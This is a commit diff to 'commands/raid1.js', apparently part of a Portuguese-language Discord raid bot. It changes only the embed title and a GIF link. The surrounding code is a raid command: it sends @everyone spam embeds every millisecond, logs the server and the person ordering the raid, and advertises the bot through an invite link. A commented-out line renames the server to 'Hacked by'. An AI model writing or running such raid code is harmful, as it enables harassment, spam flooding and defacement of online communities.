9039bcc66e0bd384967fdfcd594c79ebb88400cf
Glitch (equable-gymnast) <none>
2019-12-03 00:58:13 +0000

    💵🔦 Checkpoint ./commands/raid1.js:6833819/153

--- commands/raid1.js
+++ commands/raid1.js
@@ -3,7 +3,7 @@ const nome = require("./Nome.json").nome;
 exports.run = async (client, message, args) => {
     console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + ` | Id De ${message.author.username}: ${message.author.id}`)
     //message.guild.setName(`Hackeado Por ${arg}`)
-    let Title = "Hackeado Por " + nome
+    let Title = "EU SOU UMA FOCA AQUI OOO"
     let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
     let field = "Quer Ter Esse Bot De Raid?"
     let fieldd = "Link Servidor: https://discord.gg/x9jqsb" // descricão do field
@@ -13,7 +13,7 @@ exports.run = async (client, message, args) => {
    .setTitle(Title)
    .setColor("RANDOM")
    .setDescription(Description)
-   .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
+   .setImage("https://tenor.com/ZCAf.gif")
    .addField(field, fieldd)
    message.channel.send(embed)
     }, 1)
